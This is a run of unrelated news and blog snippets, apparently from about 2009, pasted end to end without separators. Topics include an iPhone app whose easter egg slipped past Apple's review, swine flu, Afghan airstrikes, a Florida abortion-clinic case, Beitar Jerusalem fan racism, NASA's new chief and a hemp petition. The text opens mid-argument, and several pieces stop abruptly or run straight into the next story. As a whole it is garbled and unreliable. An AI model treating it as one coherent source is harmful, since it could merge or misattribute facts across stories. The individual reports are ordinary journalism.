And if this seems too radical of a strategy for anyone then at least do not pretend to be “ all about freedom ” .
Consistency , lack of contradictions , is the only way to be truthful and with integrity .
Everything else is a fraud .

Bypass Apple ’s App Approval with Easter Eggs
Apple ’s iPhone App Store approval process has created a flurry of news with its stringent requirements , the latest of which involved an eloquent rant by Trent Reznor .
It ’s pretty hard to disagree with Reznor on this one , though we may have done so with more carefully chosen words ( you ’re too old to care so much about your rocker persona ) .
The apps that do and do n’t make it through seem arbitrary at best , and near fascist at the worst .
Developer Jelle Prins has found a way around the mess by hiding the “ worst ” of his app with a nifty little easter egg .
Prins ’ App , Lyrics , which displays the lyrics of songs in a user ’s playlist , was initially rejected because it would display all lyrics , even the obscene ones .
Approval came only after Prins installed a profanity filter .
That ’s not the end of the story .
Alongside the profanity filter , Prins scripted an easter egg that enables profanity at the user ’s discretion .
Just head to the “ About ” page on the app , swipe your fingers down three times and confirm you want to see the naughty lyrics .
Prins said the egg was easy to implement because it ’s a difficult thing to notice in the source code .
Prins also says the app was likely approved due to a lack of manpower on Apple ’s part .
Lyrics ties in to an online database to monitor usage .
That database showed only one use during his approval process , meaning just one person fired up the app , searched for a few profanities , and then pushed the thing through when he could n’t find any .
Scouring lines of code for things like Prins ’ easter egg is n’t even on the map .
Of course with all the attention on Prins and his little workaround , I would not be surprised to see the app pulled until 3.0 parental controls go live .
So much for sticking it to the man .

I love Lego's Frank Lloyd Wright Collection has a mini model of the Guggenheim Museum in NYC , but I 'm more in love with the model of the Fallingwater house built over a waterfall .

The real house sits 50 miles from Pittsburgh , and although it looks as if it belongs in the future , it was constructed around 1935 .
The house has always been one of those fantasy homes of mine , I suppose because it is in the woods , but also close to water .
( Two of my favorite things , in theory . )
A shame we can't all live somewhere so interesting .

Dunkin ' Donuts , the popular fast food chain famous for its coffee and baked goods , has released Dunkin ' Run , a free app for the iPhone and iPod touch .
It 's designed to make it easier for Dunkin ' Donuts customers to make group orders -- a social application , according to the press release .
" I'm making a run to Dunkin ' -- does anyone want anything ? " is a refrain heard in workplaces near where Dunkin ' Donuts are common .
The Dunkin ' Run app and its companion Web site help to make it easier for Dunkin ' customers to solicit and place those group orders .
" Runners " initiate the group order , then interactive alerts are sent to the Runner 's friends and co-workers , informing them when a trip is planned and inviting them to place an order online .
The Runner can then print the order or use their iPhone to produce a checklist , to make sure everyone gets what they wanted .
This story , " Dunkin ' Donuts Releases ' Social ' i Phone App " was originally published by Macworld .
Minnesota Vikings coach Brad Childress and quarterback Brett Favre plan to meet at an undisclosed location later this week to discuss the possibility of the former Packers and Jets quarterback renouncing his retirement from the NFL to play the 2009 season with the Vikings , according to a source with direct knowledge of discussions between the two parties .
There is a mutual understanding that sometime soon thereafter Favre will decide whether to sign with the Vikings .
The team would expect him to participate fully in offseason minicamps and training camps , which he missed last year with the Jets .
Childress was expected to leave Minnesota on Wednesday and meet with Favre on Wednesday night and Thursday in Mississippi , The [ Minneapolis ] Star Tribune reported on its Web site , citing a person with knowledge of the situation .
A source told ESPN's Rachel Nichols late Wednesday , however , that a meeting had not yet taken place .
Favre has not been working out , and he declined to have surgery to repair the torn biceps tendon that plagued him the final month of last season .
Favre may believe the injury can heal on its own , as did a similar problem with his left shoulder while he played in Green Bay .
A source close to Favre told ESPN's Chris Mortensen that how the injury heals will play a role in the quarterback 's decision .
Wireless iPhone Charger : Hemorrhoid Included
One of the more gimmicky advantages ( unless , of course , you build it into your BMW ) of the Palm Pre over the iPhone is wireless charging via Palm ’s Touchstone dock .
Just slap your
Pre on there and by magnetic magic ( and a whole lot of heat ) you get a fresh battery .
WildCharge wants to give iPhone users that same functionality with their WildCharger iPhone Skin .
You may remember the WildCharger from days gone by , when the Motorola RAZR was the phone to have .
On phones ( like the RAZR ) that allow you to remove the battery , it ’s kinda cool .
There are no funky connections required .
But the iPhone has a built - in battery , one that ca n’t be removed or replaced with third party units .
In order for the WildCharger to work , you need the WildCharge iPhone Skin , a $ 34.99 silicone sleeve that adds one big pimple to the ass end of your sleek little phone .
The full kit ( skin + charge pad ) will run you $ 79.99 .
The WildCharger is n’t a bad idea if you ’ve got multiple supported devices .
For me , it would only support my iPhone , and frankly I do n’t mind plugging it ( the iPhone ) in all that much .
I certainly do n’t $ 80 mind it , and if it means a little tip hanging off the end of my phone you likely wo n’t see me trying one .
Not even for a minute .
Not even just to see how it feels .
Geothermal ’s potential as a clean energy source has raised huge hopes , and its advocates believe it could put a significant dent in American dependence on fossil fuels  potentially supplying roughly 15 percent of the nation ’s electricity by 2030 , according to one estimate by Google .
The earth ’s heat is always there waiting to be tapped , unlike wind and solar power , which are intermittent and thus more fickle .
According to a 2007 geothermal report financed by the Energy Department , advanced geothermal power could in theory produce as much as 60,000 times the nation ’s annual energy usage .
President Obama , in a news conference Tuesday , cited geothermal power as part of the “ clean energy transformation ” that a climate bill now before Congress could bring about .

An earthquake halted Markus O. Häring 's geothermal project in Basel , Switzerland .
Credit ... Christian Flieri for The New York Times
Dan W. Reicher , an assistant energy secretary in the Clinton administration who is now director of climate change and energy at Google ’s investment and philanthropic arm , said geothermal energy had “ the potential to deliver vast amounts of power almost anywhere in the world , 24/7 . ”
Power companies have long produced limited amounts of geothermal energy by tapping shallow steam beds , often beneath geysers or vents called fumaroles .
Even those projects can induce earthquakes , although most are small .
But for geothermal energy to be used more widely , engineers need to find a way to draw on the heat at deeper levels percolating in the earth ’s core .
Some geothermal advocates believe the method used in Basel , and to be tried in California , could be that breakthrough .
But because large earthquakes tend to originate at great depths , breaking rock that far down carries more serious risk , seismologists say .
Seismologists have long known that human activities can trigger quakes , but they say the science is not developed enough to say for certain what will or will not set off a major temblor .
Even so , there is no shortage of money for testing the idea .
Mr. Reicher has overseen a $ 6.25 million investment by Google in AltaRock , and with more than $ 200 million in new federal money for geothermal , the Energy Department has already approved financing for related projects in Idaho by the University of Utah ; in Nevada by Ormat Technologies ; and in California by Calpine , just a few miles from AltaRock ’s project .
Steven E. Koonin , the under secretary for science at the Energy Department , said the earthquake issue was new to him , but added , “ We ’re committed to doing things in a factual and rigorous way , and if there is a problem , we will attend to it . ”
The tone is more urgent in Europe .
“ This was my main question to the experts :
Can you exclude that there is a major earthquake triggered by this man-made activity ? ” said Rudolf Braun , chairman of the project team that the City of Basel created to study the risks of resuming the project .
Saudi Arabia Oil Minister
Ali al - Naimi warned on Tuesday that a too quick promotion of investments in alternative energies could chill investments in the oil sector and create a nightmare scenario .
Substituting the current energy infrastructure will be prohibitive in the short term and given the massive scale of the global energy system , a rapid change to alternative energy will be costly and impractical , al - Naimi said yesterday at an energy summit in Houston organized by the Cambridge Energy Research Associates .
While the push for alternatives is important , we must also be mindful that efforts to rapidly promote alternatives could have a chilling effect on investment in the oil sector , al - Naimi said in a speech on Achieving Energy Stability in Uncertain Times on Tuesday , according to Reuters .
A nightmare scenario would be created if alternative energy supplies fail to meet overly optimistic expectations , while traditional energy suppliers scale back investment he added .
Al - Naimi ’s remarks come in the midst of an effort from U.S. President Barack Obama to change the energy policies of the previous administration and trigger billions of dollars of investments in alternative energy such as solar , wind and hydrothermal .
Obama considers renewable energy as a key part of his stimulus recovery plan to create jobs and to help the economy recover .
Still , Mr. Naimi acknowledged that the world was probably headed towards a transition away from fossil fuels but said he was n't clear which fuels or technologies would become economically sensible as a replacement for crude oil .
Saudi Arabia is the largest oil exporter in the world and is one of the major members of the Organization of Petroleum Exporting Countries .
The country plays a significant role in advancing the stability in world oil markets by keeping the market well supplied and maintaining proper spare capacity , Al - Naimi said according to CERA .
During his remarks , al - Naimi explained about the detrimental and unsustainable volatility of oil prices in 2008 but noted that whereas the recent past was all about risk and high returns , the present focus is on stability and survival , he said , according to the CERAweek website .
Today , if Republicans had learned the right lessons from the Westerns , or at least John Ford Westerns , they would not be the party of untrammeled freedom and maximum individual choice .
They would once again be the party of community and civic order .
They would begin every day by reminding themselves of the concrete ways people build orderly neighborhoods , and how those neighborhoods bind a nation .
They would ask :
What threatens Americans ’ efforts to build orderly places to raise their kids ?
The answers would produce an agenda : the disruption caused by a boom and bust economy ; the fragility of the American family ; the explosion of public and private debt ; the wild swings in energy costs ; the fraying of the health care system ; the segmentation of society and the way the ladders of social mobility seem to be dissolving .

But the Republican Party has mis-learned that history .
The party sometimes seems cut off from the concrete relationships of neighborhood life .
Republicans are so much the party of individualism and freedom these days that they are no longer the party of community and order .
This puts them out of touch with the young , who are exceptionally community - oriented .
It gives them nothing to say to the lower middle class , who fear that capitalism has gone haywire .
It gives them little to say to the upper middle class , who are interested in the environment and other common concerns .
The Republicans talk more about the market than about society , more about income than quality of life .
They celebrate capitalism , which is a means , and are inarticulate about the good life , which is the end .
They take things like tax cuts , which are tactics that are good in some circumstances , and elevate them to holy principle , to be pursued in all circumstances .
Earlier this month , a series of American airstrikes on a village in western Afghanistan killed dozens and dozens of people – including at least 25 civilians .
Now , U.S. forces are weighing the release of a classified video , taken from a B - 1 bomber involved in the battle .
The military is convinced that the footage will justify American troops ' actions during the firefight – and show that the Taliban committed " human sacrifice " in the village of Garani .
Human rights groups say the video may only reinforce just how questionable those airstrikes really were .
" There is indeed video from a B - 1 bomber , " U.S. Central Command chief Gen. David Petraeus tells National Public Radio .
" What it will prove is that the targets of these different strikes were the Taliban . "
What it does not prove , is that there were not civilians killed .
I think we agree , actually , that there were civilians killed in this incident along — again — with a substantial number of Taliban .
This is a very tough case because this was a very significant ambush of an Afghan force that had our advisers with it , and it was in response to that force — literally rescuing that force at the request of Afghan political leaders as well as Afghan police and military leaders — that our forces then moved in a very tough fight that these bombs were dropped .
Secretary of State Clinton , President Obama , and new U.S. ambassador to Kabul Karl Eikenberry have all apologized for the civilian deaths in Garani .
According to the International Committee of the Red Cross , those killed include " an Afghan Red Crescent volunteer and 13 members of his family who had been sheltering from fighting in a house that was bombed in an air strike . "
But U.S. military officials continue to defend their troops ' actions .
According to them , at about 3 pm on May 4th , a coalition " quick reaction force " arrived in the village of Garani to help a combined force of Afghan National Police and Afghan National Army that had been ambushed by hundreds of Taliban fighters .
An Afghan sergeant had been shot – and was trapped by heavy Taliban machine gun and rocket - propelled grenade fire .
American F / A - 18 jets were sent in , to zoom up low and fast over the town .
The idea was to scare off militants while coalition troops tried to rescue the sergeant .
When that failed , the coalition forces began bombing .
From approximately 4 pm to 6 pm , the fighter planes dropped four bombs 500 - lb bombs on " enemy compounds . "
As the battle continued , the F / A - 18s made a number of strafing runs over Garani , shooting off flares and firing its 20 mm guns .
After a lull , the bombing began again .
American military officials wo n't say what event , specifically , caused the airstrikes to restart ; they do admit , however , that at least some of the Taliban force may have left Garani during this period .
Locals tell Human Rights
Watch that most of the fighting had died down .
Nevertheless , over the course of the next three hours , the F / A - 18s dropped five more 500 pound munitions on compounds and a grove where insurgents had gathered .
" It was like Judgment Day , " Habibullah , a health worker , tells Human Rights Watch .
" Words can not describe how terrible it was .
Who can bear to see so many killed , from a two - day - old baby to a 70 - year - old woman ? "
A B - 1 bomber , flying far overhead , dropped four one - ton munitions onto a pair of large mud-brick compounds .
Villagers say more than 160 civilians , mainly women and children , had taken shelter inside the buildings , which were near a mosque and residential compounds .
According to the military , observation from forces on the ground and the video from the B - 1's weapons sight show that the buildings were on the outskirts of the village , and packed with Taliban .
The video shows two groups of fully - grown adults going inside the compounds .
Radio traffic confirmed the the insurgents ' presence .
Additional footage shows women and children streaming into other buildings that were not bombed , the military says .
The U.S. also claims it has intelligence showing that the " Taliban 's deliberate planning to create a civilian casualty disaster for us , " Lt. Commander Christine Sidenstricker , a spokesperson for U.S. Forces Afghanistan , tells Danger Room .
The militants planned to draw U.S. fire onto buildings crammed with innocents , she says .
If not enough women and children were killed , the Taliban made plans to use grenades to ensure an international outcry over civilian deaths .
American intelligence also shows Taliban fighters congratulating themselves on forcing survivors to lie to doctors – and on taking American compensation money meant for the victim 's families , Sidenstricker adds .
" This was n't collateral damage .
It was human sacrifice by the Taliban .
Deliberate civilian murder . "
It 's a claim U.S. officials have repeated any number of times , when civilians have been caught in firefights between coalition forces and the Taliban .
Rachel Reid , Afghanistan researcher for Human Rights Watch , finds the argument unconvincing .
" The U.S. military spokespeople can be quick to blame Taliban shielding for civilian deaths , even when unproven , but this does not remove their responsibility to avoid civilian harm under the laws of war .
In fact they have cried foul over Taliban shielding so many times , they ought to now be anticipating the tactic , " Reid tells Danger Room .
Yes , there 's " some evidence of Taliban shielding in Garani village .
To deliberately risk the lives of civilians for military gain is a ruthless tactic of the insurgents . "
But even if that 's true – and even if the B - 1 video shows exactly what Petraeus and Sidenstricker say it does – " there are many questions that remain to be answered by the U.S. " about the Garani incident , Reid says .
" Although the U.S. had intelligence that some insurgents remained , the proportionality of such a heavy air attack must still be in doubt .
If they were unaware of the civilian presence , their intelligence is cast into doubt ...
If they knew that civilians were still present , and dropped 8 bombs anyway , then what was the calculation of military gain versus civilian death that was made ? "
Perhaps more of those questions will be answered next week , when the military hopes to show this supposedly - definitive B - 1 video .

Samurai Cuts Baseball In Half With Sword : Video
This is the coolest thing you will see all day .
A Japanese TV show invited a samurai swordsman to the studio and fired baseballs at him from a pitching machine .
The samurai ’s goal was to draw his sword and cut the baseball in half .
The first attempt did not work , but on the second try , the sword went clean through most of the baseball , providing a clear , compact view of everything inside .
If that sword can cut through a baseball that easily , just imagine what he could do to your doughy self with it .

Influenza - like illness in the United States and Mexico
24 April 2009 - The United States Government has reported seven confirmed human cases of Swine Influenza A/ H1N1 in the USA ( five in California and two in Texas ) and nine suspect cases .
All seven confirmed cases had mild Influenza - Like Illness ( ILI ) , with only one requiring brief hospitalization .
No deaths have been reported .
The Government of Mexico has reported three separate events .
In the Federal District of Mexico , surveillance began picking up cases of ILI starting 18 March .
The number of cases has risen steadily through April and as of 23 April there are now more than 854 cases of pneumonia from the capital .
Of those , 59 have died .
In San Luis Potosi , in central Mexico , 24 cases of ILI , with three deaths , have been reported .
And from Mexicali , near the border with the United States , four cases of ILI , with no deaths , have been reported .
Of the Mexican cases , 18 have been laboratory confirmed in Canada as Swine Influenza A/ H1N1 , while 12 of those are genetically identical to the Swine Influenza A/ H1N1 viruses from California .
The majority of these cases have occurred in otherwise healthy young adults .
Influenza normally affects the very young and the very old , but these age groups have not been heavily affected in Mexico .
Because there are human cases associated with an animal influenza virus , and because of the geographical spread of multiple community outbreaks , plus the somewhat unusual age groups affected , these events are of high concern .
The Swine Influenza A/H1N1 viruses characterized in this outbreak have not been previously detected in pigs or humans .
The viruses so far characterized have been sensitive to oseltamivir , but resistant to both amantadine and rimantadine .
The World Health Organization has been in constant contact with the health authorities in the United States , Mexico and Canada in order to better understand the risk which these ILI events pose .
WHO ( and PAHO ) is sending missions of experts to Mexico to work with health authorities there .
It is helping its Member States to increase field epidemiology activities , laboratory diagnosis and clinical management .
Moreover , WHO 's partners in the Global Alert and Response Network have been alerted and are ready to assist as requested by the Member States .
WHO acknowledges the United States and Mexico for their proactive reporting and their collaboration with WHO and will continue to work with Member States to further characterize the outbreak .
MIAMI , Florida ( CNN ) --
A doctor 's license was revoked Friday in the case of a teenager who planned to have an abortion but instead gave birth to a baby she says was killed when clinic staffers put it into a plastic bag and threw it in the trash .
Pierre Jean - Jacques Renelique , right , and his attorney , Joseph Harrison , at the hearing .
The doctor , Pierre Jean - Jacques Renelique , was not present when the baby was born , but the Florida Medical Board upheld Department of Health allegations that he falsified medical records , inappropriately delegated tasks to unlicensed personnel and committed malpractice .
Joseph Harrison , the attorney representing Renelique at the license revocation hearing in Tampa , said Renelique has not decided whether to appeal .
The state attorney 's office , meanwhile , said its criminal investigation into the incident is ongoing and no charges have been filed .
A fetus born alive cannot be put to death even if its mother intended to have an abortion , police said when the incident occurred in 2006 .
The baby 's mother , Sycloria Williams , sued Renelique , the clinic and its staff in January , seeking damages .
She alleges in her suit that " she witnessed the murder of her daughter " and said she " sustained severe emotional distress , shock and psychic trauma which have resulted in discernible bodily injury . "
" This is not about a pot of gold , " said Tom Pennekamp , her attorney .
" What this is about is right and wrong and making a statement , making sure it does n't happen to other young women . "
According to the suit , Williams , then 18 , discovered while being treated for a fall that she was 23 weeks pregnant .
She went to a clinic to get an abortion on the morning of July 20 , 2006 , after receiving medication and instructions the previous day .
Renelique was not at the clinic , however , and Williams was told to wait for him .
She was given two pills and told they would make her ill .
When she complained of feeling ill , clinic staff members gave her a robe and told her to lie down in a patient room , the suit says .
Renelique was still not present when Williams " felt a large pain " and delivered a baby girl , according to the suit .
" The staff began screaming and pandemonium ensued .
Sycloria watched in horror and shock as her baby writhed with her chest rising and falling as she breathed . "
A clinic co-owner entered the room and used a pair of shears to cut the baby 's umbilical cord , the suit said .
She " then scooped up the baby and placed the live baby , placenta and afterbirth in a red plastic biohazard bag , which she sealed , and then threw bag and the baby in a trash can . "
Staff at the clinic did not call 911 or seek medical assistance for Williams or the baby , the suit said .
Renelique arrived at the clinic about an hour later and gave Williams a shot to put her to sleep .
" She awoke after the procedure and was sent home still in complete shock , " the suit said .
Police were notified of the incident by an anonymous caller who told them the baby was born alive and disposed of .
" The complainant [ Williams ] observed the baby moving and gasping for air for approximately five minutes , " according to a police affidavit requesting a search warrant for the clinic .
Two search warrants found nothing , but officers executing a third warrant " found the decomposing body of a baby in a cardboard box in a closet , " the suit said .
The baby was linked to Williams through DNA testing , the lawsuit said .
An autopsy showed it had filled its lungs with air prior to death .
Documents from the state Department of Health said its cause of death was determined to be " extreme prematurity . "
Fewer than 1 percent of babies are born at less than 28 weeks , according to the March of Dimes , a nonprofit organization aimed at reducing premature births , birth defects and infant mortality .
Infants born at that stage may survive , but require treatment with oxygen , other medical help and mechanical assistance to help them breathe .
They are too immature to suck or swallow and so must be fed intravenously .
Babies born before about 32 weeks of gestation face the highest risk of health problems , the March of Dimes said .
Williams ' lawsuit seeks damages from Renelique , the clinic and its staff .
It claims that clinic records were falsified to say only that Williams underwent an abortion .
Williams filed the suit individually and " as personal representative of the estate of Shanice Denise Osbourne , deceased , " the suit said .
The medical board 's action Friday came at the request of the Florida Department of Health , which filed an order in February 2007 seeking emergency restrictions on Renelique 's license .
Department documents list many of the same allegations as Williams ' lawsuit .
" Dr. Renelique 's failure to practice medicine with that level of care , skill and treatment that is recognized as being acceptable , as well as his willingness to falsify medical records , poses a serious and immediate danger to the public , " the health department said .
Renelique did not respond to the health department or dispute the facts it alleged , department spokeswoman Eulinda Jackson said Friday .
Williams has declined to speak publicly about the case , said Pennekamp , her attorney .
She suffers from post - traumatic stress because of the experience , he said .

National Union of Teachers conference votes to oppose use of unqualified staff – including former soldiers and police officers – to cover lessons
Bouncers , ex-soldiers and former police officers are being brought into schools to provide " crowd control " and cover absent teachers ' lessons , a teacher has revealed .
One school , thought to be in London , employed two permanent cover teachers through an agency for professional doormen , the National Union of Teachers annual conference in Cardiff heard today .
Bouncers , who more usually work nights keeping order in pubs and clubs , are being employed in schools because they are " stern and loud " , said Andrew Baisley , a teacher at Haverstock school in Camden , north London .
" I know of bouncers being employed specifically because they are bouncers to cover lessons , " he told the conference .
Recruitment agencies are advertising for people with " ex- marine , prison officer , bouncer , policeman , fireman " backgrounds to become supervisors , who do not need to have any teaching qualifications to oversee lessons .
It comes as ministers prepare to unveil the final part of a major review of children 's behaviour this week which will call on governors , headteachers and parents to support teachers when they discipline pupils .
Baisley said some schools seemed to believe the job of supervising a lesson was about " crowd control and childminding ; if you 're stern and loud , that 's what 's necessary to do the job " , he said .
" The problem is , we need someone who 's trained with children , to be able to interact with children .
If someone is away , you do n't want any teacher , you want a teacher from that particular subject so they can help the children with their work , so that the whole hour is n't a complete waste of time . "
The school Baisley knew of , which he refused to name , had recruited the pair last year .
One was subsequently dismissed over " disciplinary offences " which Baisley did not disclose , while the other is still in post .
He said job advertisements for cover teachers regularly appealed for people from military backgrounds or with police training .
One recruitment agency , Aspire People , is advertising online for " hard - core cover supervisors " to fill posts in Birmingham .
The advert , dated 10 March this year , says : " Are you looking for a career change ?
Look no further !
Aspire People are on the hunt for dynamic , inspiring , hard core cover supervisors ?
What are we looking for ?
You might be an ex-marine , prison officer , bouncer , policeman , fireman , sportsman , actor or you might be an overseas teacher looking to get some experience in the classroom .
Whichever it is we need someone who thinks they can get involved in a school environment and control the kids in schools . "
Official government guidance dictates that anyone can cover a lesson , providing they pass security checks .
Schools commonly ask other teachers to cover classes , use teaching assistants who have classroom training , or employ dedicated cover supervisors who do not necessarily have training .
Where non-trained staff are used , a senior member of the department would set the lesson up and leave the supervisor to oversee it .
From September , new rules will limit the amount of cover that teachers can provide for one another , meaning schools could become more reliant on non-qualified staff , the NUT said .
The union today voted to oppose the use of unqualified staff to cover lessons .
Members also agreed to campaign for a reduction in class sizes to 20 and a guarantee of time out of the classroom for teachers to prepare lessons .
A spokesman for the Department for Children , Schools and Families said : " Heads should ensure that the people they employ have the relevant experience and training – and that all the proper checks are carried out on anyone working with children .
Our guidance is clear that cover supervision should only be used as a short - term solution , to provide continuity when the regular teacher is unavailable .
Pupils should continue their learning through pre-prepared lessons and exercises supervised by support staff with appropriate skills and training .
It is up to heads to determine the best systems for cover in their schools .
" The days of teacher shortages are over .
We now have the highest number of teachers in a generation and more support staff than ever – including established members of the school team who can take on cover supervision . "
With travel restrictions in the UK still unclear and constantly changing , more of us than ever before are planning to take holidays and short breaks domestically .
But with so many of us …
In Soviet times they had parties too .
One of the funniest incidents in the history of Israeli football – which is usually more tragic than comic – happened during a Game between Hapoel Tel aviv and Beitar Jerusalem in 1969 .
The matches between the two were always tense .
Sport clubs in Israel developed as branches of political parties ; Hapeol was the Histadrut ’s , and therefore the Labor ’s team , while Beitar was just what its name declared – the team of Beitar , meaning the old Revisionists , Begin ’s Herut and later on , the Likud .
So troubles were almost inevitable .
The 1969 game happened to be the biggest game in the short career of Roni Calderon , Hapoel ’s brilliant attacker .
Calderon scored twice .
On the second time , legend has it that he dribbled through Beitar ’s defense , passed a few players , then the goalkeeper , only to find himself in front of a Beitar fan – a soldier armed with an Uzi – standing on the goal line .
But Calderon – who later escaped a Brazilian prison were he served time for drug offenses , and is still said to be hiding in the Tropics – was n’t easily intimidated .
He scored , the rest of the Beitar crowd stormed the pitch , and thus the game ended .
It was one of those events that created the myth of the Beitar Jerusalem crowd – known for both its unconditional love for the team and its tendency to go wild .
These fans – most of them Mizrachim – came from the poorest neighborhoods in Jerusalem .
The city ’s elite supported the rival Hapoel Jerusalem , and Beitar became a symbol of a sort of rebellion against the political establishment and the ruling social order .
Israel ’s best known comedy group , Hagashashim , had two famous sketches about Beitar fans , which established their image in Israeli popular culture .
During the 1983 -1984 season , following a supporters rampage in a cup game – again , against Hapoel Tel Aviv – Beitar was punished by the Israeli Football Association and was forced to Play almost all of its games in the first half of the following season outside Jerusalem and in empty stadiums .
But the truth is that at the time , Beitar fans were n’t much worse than those of most other big clubs , and dangerous incidents happened in Tel Aviv and Haifa as well .
It was their image , as well as the fact that by then the team had the biggest audience in Israel , that got the Beitar crowd all the attention .
But something else happened to some of Beitar fans during the 90′s – their rightist political orientation had turned into blunt racism .
Beitar Jerusalem is the only team in Israel that never hired an Arab player .
A few years ago , a Muslim African defender named Ibrahim Nadalla started playing for the team .
He was met with such hostility from the fans – there were even threats made on his life – that in a short while he gave up and left the team .
Later , when the ( then ) popular team owner , Billioner Arkadi Gaidamek , discussed in public the possibility of bringing an Arab player to the Beitar , a few supporters ’ groups announced that they will fight this idea by any possible means .
Beitar plays in what I think is the best Stadium in Israel – “ Teddy ” , named after Jerusalem ’s legendary mayor , Teddy Kollek .
On February 2005 , Israel ’s national team held a friendly match against Croatia in Teddy .
On the second half , Abbas Suan , an Arab midfielder , was sent into the game , only to be received with curses and racist calls from Beitar fans in the stands .
Fearing another embarrassment , the IFA never had the national team play again in Jerusalem – which is , after all , the state ’s capital .
That did n’t prevent Beitar fans from repeating their racist calls in numerous league games since , especially those played against Bney Sachnin , the only Arab team in the Israeli top division .
I wrote before about the relations between extreme right groups and some Beitar fans .
It is very common to see Beitar scarves or T - shirts in incidents and demonstrations involving the extreme right .
This by no means goes to say that all Beitar fans are racists , violent or even supporters of the right wing , only that there are some extreme elements within this crowd , and that for years , not the team nor the IFA had the will or the courage to confront these elements .
Racism on the football field is not a problem unique to Israel .
Italian club Lazio and the Netherlands ’ Feyenoord are infamous for the anti-Semitism of their fans .
In recent years , the European Football Association has decided to uphold increased measures against this problem , and is currently threatening to ban clubs and even associations that wo n’t be able to control their fans ’ behavior .
Maybe that ’s what prompted the IFA to act , and it seems that at long last , the massage that racism should n’t be an acceptable form of expression on the football ground is starting to come through , even in Israel .
On Thursday , the IFA court deducted one league point from Beitar for racist calls made recently by the team ’s fans .
Beitar ’s players and managers , who were expecting a fine or at worst one game with no crowd , were shocked .
There were also those who said the court was too easy on them : Beitar had a pending punishment of four league points , so a single point did n’t look like much .
But I try to look on the positive side : at the time the verdict was given , this point was very significant to the team ’s effort to win its third straight championship .
And to the best of my knowledge , it ’s the first time ever a team was punished this way for racist behavior by fans .
This decision sends an important massage : that the usual excuses , such as “ we ca n’t control our fans ” or “ it ’s not fair to punish the team and all the fans because of a small group ” , just wo n’t work anymore .
What ’s even more important , are two lessons from this case which transcend football : that ( a ) international pressure can help change Israelis institutions ’ behavior , and ( b ) that when there is a will ( to punish racism and hate talk ) , there is a way .

May 27 , 2009  -- Charles F. Bolden Jr. , President Obama 's choice to head a struggling NASA , has been in high places before .
He spent 14 years as an astronaut , from 1980 to 1994 , flying four space shuttle missions , including two as commander .
But a question of celestial proportions looms .
Can Bolden , who spent so much time and effort as a shuttle pilot , bring NASA new life , now that the shuttles are being retired ?
People who know him praise him as a natural leader and a nice , level - headed man .
He came from the Marine Corps , flew 100 sorties as a pilot in Vietnam , remained on duty during his astronaut years , and returned there after his final space flight , rising to the rank of major general before retiring in 2003 .
He spent 34 years in the military .
" He has the people skills and the technical skills to get the job done , " said Leroy Chiao , a former astronaut who has served on advisory panels with Bolden -- and was chosen to be an astronaut by a panel on which Bolden served .
" He knows how to read people , and mold them into a team . "
Bolden happens to have been on the crew of the shuttle mission that released the Hubble space telescope into orbit in 1990 .
The crew of the shuttle Atlantis just finished refurbishing the Hubble for the last time .
' Long - Term Vibrancy '
President Obama , announcing the appointments of Bolden and his deputy , Lori Garver , said , " These talented individuals will help put NASA on course to boldly push the boundaries of science , aeronautics and exploration in the 21st century and ensure the long - term vibrancy of America 's space program . "
That may sound like standard Washington rhetoric , but for NASA , " vibrancy " is perhaps the key issue .
The agency has wandered , looking for new direction ever since the Apollo astronauts went to the Moon 40 years ago .
Robotic probes , such as the Mars rovers , have been successes that caught the public imagination .
But the Space Shuttles have turned out to be delicate and expensive , and the International Space Station ( ISS ) cost $ 100 billion .
Assuming the Senate confirms him , these will now be Bolden 's headaches .
Back to the Moon ?
New NASA Chief
In 2004 after the shuttle Columbia was destroyed , President George W. Bush proposed a new " vision " : that the shuttles be retired and replaced with a new fleet of ships , called Constellation , that would be used to return NASA to its original purpose of space exploration .
Constellation spacecraft were supposed to start carrying astronauts in 2014 , take them to the moon by 2020 , and eventually on to Mars .
But five years and $ 6 billion later , they 're behind schedule , and the Ares I rocket -- derived from the shuttle 's solid - rocket boosters -- is plagued with technical problems .
Would Bolden be willing to turn in a new direction ?
After leaving the Marine Corps , he worked for two aerospace firms that are building components for Ares .
" On what grounds could anyone object to Bolden ? " said Bob Park , a physicist at the University of Maryland who has often been critical of NASA .
" He has only one serious flaw : He is a former astronaut . "
" Can Bolden rise above his astronaut background ? " asked Park in an e-mail to ABC News .
" Could this be like Nixon going to China ?
Only a former astronaut could take the steps necessary to move NASA away from the expensive and unproductive man - in - space program .
Is Bolden the one ? "
The Obama White House has already ordered a special panel to review the Constellation plan , and decide whether it is on the right track .
One question before it is whether to abandon the Ares rocket , and instead use other existing boosters .
Bolden was born on Aug. 19 , 1946 , in Columbia , S.C. He attended the U.S. Naval Academy in Annapolis before becoming a Marine officer .
He would be the first African American to lead NASA , and only the second astronaut to hold the job on more than an interim basis .
Most previous NASA administrators have either been engineers or had previous experience at government agencies .
Bolden is a former consultant on space issues for ABC News , and continued , up until the White House announcement , to consult for ABC's Houston affiliate , KTRK - TV .
He told KTRK he has been asked by the White House not to give interviews until after his Senate confirmation .
One of Bolden 's biggest backers in Washington has been Sen. Bill Nelson , D - Fla. , who flew with Bolden on a space shuttle mission in 1986 .
" He 'll be facing budgetary constraints , technical issues , the remaining shuttle launches and the pending retirement of the shuttle program , " said Nelson , " and restoring the wonder that space exploration can provide . "
Dear Gov. Beshear :
We the undersigned who are either current or past residents of the Commonwealth of Kentucky have a desire to see the proletariat not struggle to provide ourselves and families with the basic necessities of life , so we are urging you to consider the following as our Commonwealth faces some of the biggest shortfalls in our budget within decades :
Beginning after World War I and before World War II , our country began its devastating war and battle against hemp and its cousin marijuana for various reasons , which I will not cover here .
But due to the Harrison Narcotics Act , the Marihuana Tax Act , and the Controlled Substances Act ( various versions ) , it is a criminal offense to grow , distribute , and consume hemp and marijuana plants and / or leaves in the United States , however , each state and commonwealth have rights -- commonly called states ' rights -- that we should follow in the smart footsteps of Gov. Schwarzenegger and look back to the legal cultivation , processing , and distribution of hemp and ( medical ) marijuana -- the largest cash crop overall in the United States .
Kentucky has some of the most fertile soil in the United States and with an increase in community gardens , urban gardens ( backyard and frontyard ) , school gardens , rural gardens , and a desire and need to seek alternatives in Kentucky since tobacco and coal are on their way out the door , we need viable income alternatives that can steer us in a sustainable direction ( and this does not mean " clean coal " , hybrid vehicles , CFL bulbs , or others as they are not truly sustainable nor eco-friendly ) .
With the resurrection of hemp , we can create and sustain old and new family / community farms ( urban and rural ) , create new industry , re-open and reclaim old manufacturing and textile facilities for the processing of hemp by - products ( well over 200 ) , including bio - diesel , ethanol , paper , paint , bird seed , green plastics , clothing , and many , many others .
